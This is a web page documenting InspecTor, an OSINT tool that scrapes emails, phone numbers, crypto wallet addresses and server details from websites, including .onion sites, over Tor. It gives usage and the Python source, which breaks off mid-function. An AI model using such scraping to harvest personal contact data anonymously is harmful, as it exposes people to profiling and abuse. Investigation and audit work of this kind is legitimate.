[{"content":"InspecTor: Metadata Extraction from Websites InspecTor is a command-line tool designed for extracting metadata from websites, including .onion domains, while maintaining anonymity through the Tor network. This tool provides a straightforward way to gather information such as emails, phone numbers, links, images, and more, making it useful for cybersecurity researchers, investigators, and analysts. Its ability to handle dynamic content with Selenium and process multiple URLs concurrently adds flexibility and efficiency to metadata collection.\nPurpose and Use Cases InspecTor is built for scenarios where metadata from websites needs to be extracted efficiently and anonymously. By routing requests through Tor, it supports investigations into .onion sites without revealing the user\u0026rsquo;s identity. The tool is particularly suited for:\nCybersecurity Research: Extracting emails, crypto wallet addresses, and server technologies for threat analysis. OSINT Investigations: Gathering links, contact details, and other metadata from publicly accessible websites. Website Audits: Identifying exposed information such as headers, social media links, or CSP policies. Key Features Extraction of metadata fields such as emails, phone numbers, images, links, and more. Support for .onion websites via the Tor network. Handling of dynamic content using Selenium (optional). Concurrent processing of multiple URLs with configurable threading. Output to JSON, SQLite database, or human-readable format. Flexible metadata field selection for targeted extractions. Installation To set up InspecTor:\nClone the repository:\ngit clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor Install Python dependencies:\npip install -r requirements.txt Install Tor and ensure it is running:\nsudo apt update sudo apt install tor sudo systemctl start tor Set up Chrome and ChromeDriver (if using Selenium):\nInstall Chrome from the official website. Download the matching ChromeDriver version based on your Chrome browser version. Usage InspecTor accepts URLs directly or through input files. Below are common usage scenarios:\nExtract Metadata from Specific URLs To extract metadata from one or more URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Extract Metadata from a File of URLs Provide a text file with one URL per line:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests, including those to non-.onion domains, through the Tor network:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Specify an output file or SQLite database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Metadata Fields Select fields like emails, links, or phone_numbers for targeted extractions:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle Dynamic Content with Selenium Enable Selenium for JavaScript-heavy pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Examples Extract all metadata:\npython3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Extract emails and phone numbers:\npython3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Disable SSL verification and output results in a human-readable format:\npython3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON File: Save metadata to a file using the -o option. Use \u0026quot;-\u0026quot; to output directly to stdout. SQLite Database: Store metadata in a database with the --database option. Human-Readable: Print results in a user-friendly format using --human-readable. Notes and Considerations Tor Requirements: Ensure the Tor service is running on 127.0.0.1:9050 to access .onion domains or force Tor routing. Selenium Setup: If dynamic content extraction is required, make sure Chrome and ChromeDriver are installed and configured. SSL Verification: SSL certificate verification is enabled by default. Use --no-verify-ssl for sites with invalid certificates. Concurrency: Adjust the number of threads using --max-workers for faster processing. Dependencies: Install all Python dependencies from requirements.txt. Why Use InspecTor? InspecTor simplifies metadata collection from websites, particularly .onion domains, by integrating essential features into a single, configurable tool. Its focus on anonymity, flexibility, and targeted extraction makes it valuable for cybersecurity research and OSINT investigations. Whether you are analyzing a website’s metadata, auditing exposed information, or conducting investigations, InspecTor is a practical tool designed to save time and effort.\nScript #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; InspecTor.py A script to extract metadata from websites using optional Tor anonymity. Author: Noobosaurus R3x Date: December 2024 Note: I am not a professional developer, and this tool could be improved with your help. Feel free to fork the repository and enhance it by adding features, fixing bugs, or optimizing the code. \u0026#34;\u0026#34;\u0026#34; import argparse import json import logging import os import re import socket import sys import time import html from concurrent.futures import ThreadPoolExecutor, as_completed from urllib.parse import urljoin, urlparse import requests from bs4 import BeautifulSoup from requests.adapters import HTTPAdapter from urllib import robotparser import sqlite3 from urllib3.util.retry import Retry from fake_useragent import UserAgent from datetime import datetime import phonenumbers from phonenumbers import NumberParseException from urllib3.exceptions import InsecureRequestWarning import urllib3 # Disable insecure request warnings if SSL verification is off. urllib3.disable_warnings(category=InsecureRequestWarning) try: from colorama import Fore, Style, init init(autoreset=True) except ImportError: print(\u0026#34;The \u0026#39;colorama\u0026#39; library is required for colored output. Please install it using \u0026#39;pip install colorama\u0026#39;.\u0026#34;) sys.exit(1) try: from selenium import webdriver from selenium.webdriver.chrome.options import Options SELENIUM_AVAILABLE = True except ImportError: SELENIUM_AVAILABLE = False def setup_logging(): \u0026#34;\u0026#34;\u0026#34; Set up the logging configuration. Logs are displayed both on stdout and in \u0026#39;InspecTor.log\u0026#39;. \u0026#34;\u0026#34;\u0026#34; logging.basicConfig( level=logging.INFO, format=\u0026#39;%(asctime)s - %(levelname)s - %(message)s\u0026#39;, handlers=[ logging.StreamHandler(sys.stdout), logging.FileHandler(\u0026#39;InspecTor.log\u0026#39;) ] ) def setup_argparser(): \u0026#34;\u0026#34;\u0026#34; Set up command-line argument parsing with options for URLs, files, output, SSL verification, Selenium usage, concurrency, database, and fields. \u0026#34;\u0026#34;\u0026#34; parser = argparse.ArgumentParser( description=\u0026#39;Extract metadata from websites using optional Tor anonymity.\u0026#39; ) # One of these two arguments is required group = parser.add_mutually_exclusive_group(required=True) group.add_argument( \u0026#39;-u\u0026#39;, \u0026#39;--urls\u0026#39;, nargs=\u0026#39;+\u0026#39;, help=\u0026#39;List of URLs to scrape.\u0026#39; ) group.add_argument( \u0026#39;-f\u0026#39;, \u0026#39;--file\u0026#39;, type=str, help=\u0026#39;Path to a file containing URLs, one per line.\u0026#39; ) parser.add_argument( \u0026#39;-o\u0026#39;, \u0026#39;--output\u0026#39;, type=str, default=\u0026#39;site_metadata.json\u0026#39;, help=\u0026#39;Output JSON file to save metadata (use \u0026#34;-\u0026#34; for stdout).\u0026#39; ) parser.add_argument( \u0026#39;--verify-ssl\u0026#39;, dest=\u0026#39;verify_ssl\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Enable SSL certificate verification (default: True).\u0026#39; ) parser.add_argument( \u0026#39;--no-verify-ssl\u0026#39;, dest=\u0026#39;verify_ssl\u0026#39;, action=\u0026#39;store_false\u0026#39;, help=\u0026#39;Disable SSL certificate verification.\u0026#39; ) parser.set_defaults(verify_ssl=True) parser.add_argument( \u0026#39;--use-selenium\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Use Selenium for handling dynamic content (requires ChromeDriver).\u0026#39; ) parser.add_argument( \u0026#39;--max-workers\u0026#39;, type=int, default=5, help=\u0026#39;Maximum number of concurrent threads (default: 5).\u0026#39; ) parser.add_argument( \u0026#39;--database\u0026#39;, type=str, default=\u0026#39;metadata.db\u0026#39;, help=\u0026#39;SQLite database file to store metadata (default: metadata.db).\u0026#39; ) # Field extraction options extraction_group = parser.add_mutually_exclusive_group() extraction_group.add_argument( \u0026#39;--fields\u0026#39;, nargs=\u0026#39;+\u0026#39;, help=\u0026#39;Specify which metadata fields to extract. \u0026#39; \u0026#39;Available fields: url, title, description, keywords, og_title, og_description, \u0026#39; \u0026#39;timestamp, headers, images, scripts, css_files, social_links, \u0026#39; \u0026#39;csp, server_technologies, crypto_wallets, links, emails, external_links, \u0026#39; \u0026#39;http_headers, phone_numbers.\u0026#39; ) extraction_group.add_argument( \u0026#39;--extract-all\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Extract all available metadata fields.\u0026#39; ) parser.add_argument( \u0026#39;--human-readable\u0026#39;, \u0026#39;-hr\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Output the results in a human-readable format.\u0026#39; ) parser.add_argument( \u0026#39;--force-tor\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Route all traffic through Tor, even for regular URLs.\u0026#39; ) parser.add_argument( \u0026#39;--default-region\u0026#39;, type=str, default=None, help=\u0026#39;Default region code for parsing phone numbers (e.g., \u0026#34;FR\u0026#34; for France).\u0026#39; ) return parser def load_urls_from_file(file_path): \u0026#34;\u0026#34;\u0026#34; Load URLs from a text file, one per line. If the file is not found, the script exits. \u0026#34;\u0026#34;\u0026#34; if not os.path.isfile(file_path): logging.error(f\u0026#34;The file \u0026#39;{file_path}\u0026#39; does not exist.\u0026#34;) sys.exit(1) with open(file_path, \u0026#39;r\u0026#39;) as f: urls = [line.strip() for line in f if line.strip()] return urls def setup_session(verify_ssl=True, use_tor=False): \u0026#34;\u0026#34;\u0026#34; Set up a requests session with optional Tor proxy and a retry strategy. Also sets a random or fallback User-Agent header. \u0026#34;\u0026#34;\u0026#34; session = requests.Session() if use_tor: session.proxies = { \u0026#39;http\u0026#39;: \u0026#39;socks5h://127.0.0.1:9050\u0026#39;, \u0026#39;https\u0026#39;: \u0026#39;socks5h://127.0.0.1:9050\u0026#39; } # Configure retries for robustness retries = HTTPAdapter(max_retries=Retry( total=3, backoff_factor=2, status_forcelist=[500, 502, 503, 504], allowed_methods=[\u0026#34;HEAD\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;OPTIONS\u0026#34;] )) session.mount(\u0026#39;http://\u0026#39;, retries) session.mount(\u0026#39;https://\u0026#39;, retries) # Handle SSL verification if disabled session.verify = verify_ssl # Try to use a randomized User-Agent to avoid easy fingerprinting ua = UserAgent() try: session.headers.update({\u0026#39;User-Agent\u0026#39;: ua.random}) except Exception as e: logging.warning(f\u0026#34;Failed to retrieve a random User-Agent. Falling back to default. Error: {e}\u0026#34;) session.headers.update({\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) \u0026#39; \u0026#39;AppleWebKit/537.36 (KHTML, like Gecko) \u0026#39; \u0026#39;Chrome/91.0.4472.124 Safari/537.36\u0026#39;}) return session def is_tor_port_open(host=\u0026#39;127.0.0.1\u0026#39;, port=9050): \u0026#34;\u0026#34;\u0026#34; Check if the Tor SOCKS5 proxy port is open. This ensures Tor is running and accessible. \u0026#34;\u0026#34;\u0026#34; with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(5) try: s.connect((host, port)) logging.info(f\u0026#34;Tor SOCKS5 proxy is listening on {host}:{port}.\u0026#34;) return True except socket.error: logging.error(f\u0026#34;Cannot connect to Tor SOCKS5 proxy on {host}:{port}.\u0026#34;) return False def is_valid_url(url): \u0026#34;\u0026#34;\u0026#34; Validate the URL\u0026#39;s scheme and netloc to ensure it\u0026#39;s well-formed. \u0026#34;\u0026#34;\u0026#34; try: parsed = urlparse(url) if parsed.scheme not in (\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;): return False if not parsed.netloc: return False return True except Exception: return False def extract_phone_numbers(page_text, default_region=None): \u0026#34;\u0026#34;\u0026#34; Extract phone numbers from page text using the phonenumbers library. This tries to parse and format phone numbers found in the text. \u0026#34;\u0026#34;\u0026#34; potential_numbers = re.findall(r\u0026#39;\\+?\\d[\\d\\s().-]{7,}\\d\u0026#39;, page_text) phone_numbers_list = [] for number in potential_numbers: try: parsed_number = phonenumbers.parse(number, default_region) if phonenumbers.is_valid_number(parsed_number): formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164) phone_numbers_list.append(formatted_number) except NumberParseException: continue return list(set(phone_numbers_list)) if phone_numbers_list else None def decode_email(encoded_str): \u0026#34;\u0026#34;\u0026#34; Decode HTML-escaped strings. This is useful if email addresses are obfuscated. \u0026#34;\u0026#34;\u0026#34; decoded_str = html.unescape(encoded_str) return decoded_str def try_selenium(url, use_tor): \u0026#34;\u0026#34;\u0026#34; Attempt to use Selenium with a headless Chrome browser to render dynamic content. If Selenium or ChromeDriver is not available, or if any error occurs, this returns (None, None), indicating that the code should fall back to the requests library. \u0026#34;\u0026#34;\u0026#34; if not SELENIUM_AVAILABLE: logging.warning(\u0026#34;Selenium is not available. Falling back to requests only.\u0026#34;) return None, None options = Options() # Use the recommended \u0026#39;--headless\u0026#39; flag for newer Chrome versions options.add_argument(\u0026#39;--headless\u0026#39;) options.add_argument(\u0026#39;--disable-gpu\u0026#39;) options.add_argument(\u0026#39;--no-sandbox\u0026#39;) options.add_argument(\u0026#39;--disable-dev-shm-usage\u0026#39;) if use_tor: options.add_argument(\u0026#39;--proxy-server=socks5://127.0.0.1:9050\u0026#39;) try: driver = webdriver.Chrome(options=options) except Exception as e: logging.warning(f\u0026#34;Unable to start Selenium Chrome WebDriver: {e}. Falling back to requests only.\u0026#34;) return None, None try: driver.set_page_load_timeout(30) driver.get(url) # Wait for JS to load some content time.sleep(5) page_source = driver.page_source driver.quit() soup = BeautifulSoup(page_source, \u0026#39;html.parser\u0026#39;) # Selenium doesn\u0026#39;t provide direct access to response headers # so we return empty for headers response_headers = {} return soup, response_headers except Exception as e: logging.error(f\u0026#34;Selenium failed to retrieve {url}: {e}\u0026#34;) driver.quit() return None, None def extract_metadata(url, args, fields=None, default_region=None): \u0026#34;\u0026#34;\u0026#34; Extract metadata from a given URL. Uses requests or Selenium based on args. Fields to extract can be specified, or \u0026#39;--extract-all\u0026#39; can be used for everything. If the URL is an onion domain or Tor is forced, requests go through Tor. \u0026#34;\u0026#34;\u0026#34; is_onion = urlparse(url).netloc.endswith(\u0026#39;.onion\u0026#39;) use_tor = is_onion or args.force_tor session = setup_session(verify_ssl=args.verify_ssl, use_tor=use_tor) # Define all possible fields for future reference all_possible_fields = { \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;http_headers\u0026#39;, \u0026#39;phone_numbers\u0026#39; } # Determine which fields we want to extract if args.extract_all: fields_to_extract = all_possible_fields else: if fields is None: # Default fields if none provided fields_to_extract = { \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;http_headers\u0026#39; } else: invalid_fields = set(fields) - all_possible_fields if invalid_fields: logging.warning(f\u0026#34;Invalid fields specified for extraction: {\u0026#39;, \u0026#39;.join(invalid_fields)}\u0026#34;) fields_to_extract = set(fields) - invalid_fields else: fields_to_extract = set(fields) # Attempt Selenium if requested if args.use_selenium: soup, response_headers = try_selenium(url, use_tor) if soup is None: # If Selenium failed, fallback to requests try: response = session.get(url, timeout=15) response.raise_for_status() soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) response_headers = dict(response.headers) except requests.exceptions.RequestException as e: logging.error(f\u0026#34;Connection error accessing {url}: {e}\u0026#34;) return None else: # If Selenium not requested, use requests directly try: response = session.get(url, timeout=15) response.raise_for_status() soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) response_headers = dict(response.headers) except requests.exceptions.RequestException as e: logging.error(f\u0026#34;Connection error accessing {url}: {e}\u0026#34;) return None metadata = {} page_text = soup.get_text() # Extracting fields one by one, checking if they are requested if \u0026#39;url\u0026#39; in fields_to_extract: metadata[\u0026#39;url\u0026#39;] = url if \u0026#39;title\u0026#39; in fields_to_extract: metadata[\u0026#39;title\u0026#39;] = soup.title.string.strip() if soup.title and soup.title.string else None if \u0026#39;description\u0026#39; in fields_to_extract: meta_desc = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;name\u0026#39;: \u0026#39;description\u0026#39;}) metadata[\u0026#39;description\u0026#39;] = meta_desc.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if meta_desc else None if \u0026#39;keywords\u0026#39; in fields_to_extract: meta_keywords = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;name\u0026#39;: \u0026#39;keywords\u0026#39;}) metadata[\u0026#39;keywords\u0026#39;] = meta_keywords.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if meta_keywords else None if \u0026#39;og_title\u0026#39; in fields_to_extract: og_title = soup.find(\u0026#39;meta\u0026#39;, property=\u0026#39;og:title\u0026#39;) metadata[\u0026#39;og_title\u0026#39;] = og_title.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if og_title else None if \u0026#39;og_description\u0026#39; in fields_to_extract: og_description = soup.find(\u0026#39;meta\u0026#39;, property=\u0026#39;og:description\u0026#39;) metadata[\u0026#39;og_description\u0026#39;] = og_description.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if og_description else None if \u0026#39;timestamp\u0026#39; in fields_to_extract: metadata[\u0026#39;timestamp\u0026#39;] = datetime.utcnow().replace(microsecond=0).isoformat() + \u0026#34;Z\u0026#34; if \u0026#39;http_headers\u0026#39; in fields_to_extract: metadata[\u0026#39;http_headers\u0026#39;] = response_headers if response_headers else None # Additional fields that require more complex extraction logic if fields_to_extract.intersection({ \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;phone_numbers\u0026#39; }): if \u0026#39;headers\u0026#39; in fields_to_extract: # Extract h1, h2, h3 headers headers_list = [header.get_text(strip=True) for header in soup.find_all([\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;, \u0026#39;h3\u0026#39;])] metadata[\u0026#39;headers\u0026#39;] = headers_list if headers_list else None if \u0026#39;images\u0026#39; in fields_to_extract: # Extract images and their alt attributes images_list = [{\u0026#39;src\u0026#39;: img.get(\u0026#39;src\u0026#39;), \u0026#39;alt\u0026#39;: (img.get(\u0026#39;alt\u0026#39;, \u0026#39;\u0026#39;) or \u0026#39;\u0026#39;).strip()} for img in soup.find_all(\u0026#39;img\u0026#39;, src=True)] metadata[\u0026#39;images\u0026#39;] = images_list if images_list else None if \u0026#39;scripts\u0026#39; in fields_to_extract: # Extract external scripts scripts_list = [script[\u0026#39;src\u0026#39;] for script in soup.find_all(\u0026#39;script\u0026#39;, src=True)] metadata[\u0026#39;scripts\u0026#39;] = scripts_list if scripts_list else None if \u0026#39;css_files\u0026#39; in fields_to_extract: # Extract CSS files css_files_list = [link[\u0026#39;href\u0026#39;] for link in soup.find_all(\u0026#39;link\u0026#39;, rel=\u0026#39;stylesheet\u0026#39;)] metadata[\u0026#39;css_files\u0026#39;] = css_files_list if css_files_list else None if \u0026#39;social_links\u0026#39; in fields_to_extract: # Extract social media links by matching known platforms social_links_list = [a[\u0026#39;href\u0026#39;] for a in soup.find_all(\u0026#39;a\u0026#39;, href=True) if any(platform in a[\u0026#39;href\u0026#39;] for platform in [\u0026#39;twitter.com\u0026#39;, \u0026#39;facebook.com\u0026#39;, \u0026#39;linkedin.com\u0026#39;])] metadata[\u0026#39;social_links\u0026#39;] = social_links_list if social_links_list else None if \u0026#39;csp\u0026#39; in fields_to_extract: # Extract Content-Security-Policy meta tag if available csp = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;http-equiv\u0026#39;: \u0026#39;Content-Security-Policy\u0026#39;}) metadata[\u0026#39;csp\u0026#39;] = csp[\u0026#39;content\u0026#39;] if csp else None if \u0026#39;server_technologies\u0026#39; in fields_to_extract: # Identify server technologies from headers server_technologies = {} if response_headers: if \u0026#39;Server\u0026#39; in response_headers: server_technologies[\u0026#39;server\u0026#39;] = response_headers.get(\u0026#39;Server\u0026#39;) if \u0026#39;X-Powered-By\u0026#39; in response_headers: server_technologies[\u0026#39;powered_by\u0026#39;] = response_headers.get(\u0026#39;X-Powered-By\u0026#39;) metadata[\u0026#39;server_technologies\u0026#39;] = server_technologies if server_technologies else None if \u0026#39;crypto_wallets\u0026#39; in fields_to_extract: # Extract various crypto wallet addresses from the page text crypto_wallets = {} # Bitcoin addresses bitcoin_addresses = re.findall(r\u0026#39;\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b\u0026#39;, page_text) if bitcoin_addresses: crypto_wallets[\u0026#39;bitcoin\u0026#39;] = list(set(bitcoin_addresses)) # Ethereum addresses ethereum_addresses = re.findall(r\u0026#39;\\b0x[a-fA-F0-9]{40}\\b\u0026#39;, page_text) if ethereum_addresses: crypto_wallets[\u0026#39;ethereum\u0026#39;] = list(set(ethereum_addresses)) # Litecoin addresses litecoin_legacy = re.findall(r\u0026#39;\\b[L,M][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) litecoin_bech32 = re.findall(r\u0026#39;\\bltc1[a-z0-9]{39}\\b\u0026#39;, page_text) if litecoin_legacy or litecoin_bech32: crypto_wallets[\u0026#39;litecoin\u0026#39;] = list(set(litecoin_legacy + litecoin_bech32)) # Dogecoin addresses dogecoin_addresses = re.findall(r\u0026#39;\\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\\b\u0026#39;, page_text) if dogecoin_addresses: crypto_wallets[\u0026#39;dogecoin\u0026#39;] = list(set(dogecoin_addresses)) # Bitcoin Cash bch_legacy = re.findall(r\u0026#39;\\b[L,M][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) bch_cashaddr = re.findall(r\u0026#39;\\b(q|p)[a-z0-9]{41}\\b\u0026#39;, page_text) if bch_legacy or bch_cashaddr: crypto_wallets[\u0026#39;bitcoin_cash\u0026#39;] = list(set(bch_legacy + bch_cashaddr)) # Dash dash_addresses = re.findall(r\u0026#39;\\b[X,7][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) if dash_addresses: crypto_wallets[\u0026#39;dash\u0026#39;] = list(set(dash_addresses)) # Monero monero_standard = re.findall(r\u0026#39;\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b\u0026#39;, page_text) monero_integrated = re.findall(r\u0026#39;\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{105}\\b\u0026#39;, page_text) if monero_standard or monero_integrated: crypto_wallets[\u0026#39;monero\u0026#39;] = list(set(monero_standard + monero_integrated)) # Ripple ripple_addresses = re.findall(r\u0026#39;\\br[0-9A-Za-z]{24,34}\\b\u0026#39;, page_text) if ripple_addresses: crypto_wallets[\u0026#39;ripple\u0026#39;] = list(set(ripple_addresses)) # Zcash zcash_transparent = re.findall(r\u0026#39;\\bt[1,3][a-km-zA-HJ-NP-Z1-9]{33}\\b\u0026#39;, page_text) zcash_shielded = re.findall(r\u0026#39;\\bzs[a-z0-9]{93}\\b\u0026#39;, page_text) if zcash_transparent or zcash_shielded: crypto_wallets[\u0026#39;zcash\u0026#39;] = list(set((zcash_transparent + zcash_shielded))) # Binance Coin binance_chain = re.findall(r\u0026#39;\\bbnb1[a-z0-9]{38}\\b\u0026#39;, page_text) binance_smart = ethereum_addresses if binance_chain or binance_smart: combined_binance = list(set(binance_chain + binance_smart)) if binance_smart else binance_chain crypto_wallets[\u0026#39;binance_coin\u0026#39;] = combined_binance # Cardano cardano_addresses = re.findall(r\u0026#39;\\baddr1[a-z0-9]{58}\\b\u0026#39;, page_text) if cardano_addresses: crypto_wallets[\u0026#39;cardano\u0026#39;] = list(set(cardano_addresses)) # Stellar stellar_addresses = re.findall(r\u0026#39;\\bG[A-Z2-7]{55}\\b\u0026#39;, page_text) if stellar_addresses: crypto_wallets[\u0026#39;stellar\u0026#39;] = list(set(stellar_addresses)) # Tether tether_omni = re.findall(r\u0026#39;\\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) tether_erc20 = ethereum_addresses tether_trc20 = re.findall(r\u0026#39;\\bT[a-z0-9]{33}\\b\u0026#39;, page_text) tether_combined = tether_omni + tether_erc20 + tether_trc20 if tether_erc20 else tether_omni + tether_trc20 if tether_combined: crypto_wallets[\u0026#39;tether\u0026#39;] = list(set(tether_combined)) # Solana solana_addresses = re.findall(r\u0026#39;\\b[A-HJ-NP-Za-km-z1-9]{43,44}\\b\u0026#39;, page_text) if solana_addresses: crypto_wallets[\u0026#39;solana\u0026#39;] = list(set(solana_addresses)) # Polkadot addresses (corrected pattern) polkadot_addresses = re.findall(r\u0026#39;\\b1[a-z0-9]{46}\\b\u0026#39;, page_text) if polkadot_addresses: crypto_wallets[\u0026#39;polkadot\u0026#39;] = list(set(polkadot_addresses)) # Chainlink chainlink_addresses = ethereum_addresses if chainlink_addresses: crypto_wallets[\u0026#39;chainlink\u0026#39;] = list(set(chainlink_addresses)) # Ethereum Classic etc_addresses = ethereum_addresses if etc_addresses: crypto_wallets[\u0026#39;ethereum_classic\u0026#39;] = list(set(etc_addresses)) metadata[\u0026#39;crypto_wallets\u0026#39;] = crypto_wallets if crypto_wallets else None if \u0026#39;links\u0026#39; in fields_to_extract or \u0026#39;external_links\u0026#39; in fields_to_extract: # Distinguish between internal and external links internal_links = [] external_links_list = [] base_netloc = urlparse(url).netloc for a in soup.find_all(\u0026#39;a\u0026#39;, href=True): href = a[\u0026#39;href\u0026#39;] parsed_href = urlparse(urljoin(url, href)) if base_netloc == parsed_href.netloc: internal_links.append(href) else: external_links_list.append(href) if \u0026#39;links\u0026#39; in fields_to_extract and internal_links: metadata[\u0026#39;links\u0026#39;] = internal_links if \u0026#39;external_links\u0026#39; in fields_to_extract and external_links_list: metadata[\u0026#39;external_links\u0026#39;] = external_links_list if \u0026#39;emails\u0026#39; in fields_to_extract: # Extract emails from text and mailto links emails = set() text_emails = re.findall(r\u0026#39;[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+\u0026#39;, page_text) emails.update(text_emails) # Extract emails from mailto links for a_tag in soup.find_all(\u0026#39;a\u0026#39;, href=True): href = a_tag[\u0026#39;href\u0026#39;] if \u0026#39;mailto:\u0026#39; in href: email = href.split(\u0026#39;mailto:\u0026#39;)[-1] email = decode_email(email) emails.add(email) # Extract reversed emails if present in custom tags for span in soup.find_all(\u0026#39;span\u0026#39;, {\u0026#39;class\u0026#39;: \u0026#39;odEmail\u0026#39;}): user = span.get(\u0026#39;data-user\u0026#39;, \u0026#39;\u0026#39;) website = span.get(\u0026#39;data-website\u0026#39;, \u0026#39;\u0026#39;) if user and website: user = user[::-1] website = website[::-1] email = f\u0026#34;{user}@{website}\u0026#34; emails.add(email) metadata[\u0026#39;emails\u0026#39;] = list(emails) if emails else None if \u0026#39;phone_numbers\u0026#39; in fields_to_extract: # Extract phone numbers phone_numbers_found = extract_phone_numbers(page_text, default_region=default_region) metadata[\u0026#39;phone_numbers\u0026#39;] = phone_numbers_found if phone_numbers_found else None if metadata: logging.info(f\u0026#34;Metadata extracted from {url}\u0026#34;) return metadata else: logging.error(f\u0026#34;No metadata extracted from {url}\u0026#34;) return None def setup_database(db_path=\u0026#39;metadata.db\u0026#39;): \u0026#34;\u0026#34;\u0026#34; Set up a SQLite database to store metadata. Create a table if it does not already exist. \u0026#34;\u0026#34;\u0026#34; conn = sqlite3.connect(db_path) cursor = conn.cursor() cursor.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS metadata ( url TEXT PRIMARY KEY, title TEXT, description TEXT, keywords TEXT, og_title TEXT, og_description TEXT, timestamp TEXT, headers TEXT, images TEXT, scripts TEXT, css_files TEXT, social_links TEXT, csp TEXT, server_technologies TEXT, crypto_wallets TEXT, links TEXT, emails TEXT, external_links TEXT, http_headers TEXT, phone_numbers TEXT ) \u0026#39;\u0026#39;\u0026#39;) conn.commit() return conn def save_to_database(conn, metadata): \u0026#34;\u0026#34;\u0026#34; Save extracted metadata to the SQLite database. JSON fields are stored as JSON-encoded strings for complex fields. If a record with the same URL exists, it is replaced. \u0026#34;\u0026#34;\u0026#34; cursor = conn.cursor() cursor.execute(\u0026#39;\u0026#39;\u0026#39; INSERT OR REPLACE INTO metadata (url, title, description, keywords, og_title, og_description, timestamp, headers, images, scripts, css_files, social_links, csp, server_technologies, crypto_wallets, links, emails, external_links, http_headers, phone_numbers) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) \u0026#39;\u0026#39;\u0026#39;, ( metadata.get(\u0026#39;url\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;title\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;description\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;keywords\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;og_title\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;og_description\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;timestamp\u0026#39;, \u0026#39;\u0026#39;), json.dumps(metadata.get(\u0026#39;headers\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;images\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;scripts\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;css_files\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;social_links\u0026#39;, [])), metadata.get(\u0026#39;csp\u0026#39;, \u0026#39;\u0026#39;), json.dumps(metadata.get(\u0026#39;server_technologies\u0026#39;, {})), json.dumps(metadata.get(\u0026#39;crypto_wallets\u0026#39;, {})), 